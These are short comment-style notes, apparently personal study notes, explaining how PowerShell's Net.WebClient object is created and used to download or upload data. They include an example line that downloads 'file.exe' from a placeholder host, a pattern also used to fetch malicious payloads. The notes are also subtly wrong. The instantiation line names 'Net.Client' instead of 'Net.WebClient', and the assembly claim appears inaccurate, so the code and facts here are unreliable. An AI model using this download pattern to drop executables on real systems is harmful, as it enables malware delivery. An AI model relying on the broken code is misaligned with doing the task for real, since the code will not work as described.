'Call a class such as "Net.WebClient" and then instantiate it as an object via $wc = New-Object Net.Client
'$ sets a variable in PowerShell. $wc is now a object stored within the variable.
'Then call a method within the Net.WebClient class such as .DownloadFile or .UploadData.
'Methods take parameters such as .DownloadFile taking URL and filename .DownloadFile(URL,outfile)
'You must append the method and parameters to a instantiated object like so - $wc.DownloadFile("http://blah.com", "file.exe")
'You can call the class inline with System.Net.WebClient (comes from the dll/assembly System.Net.WebClient.dll, as class if not instantiated).
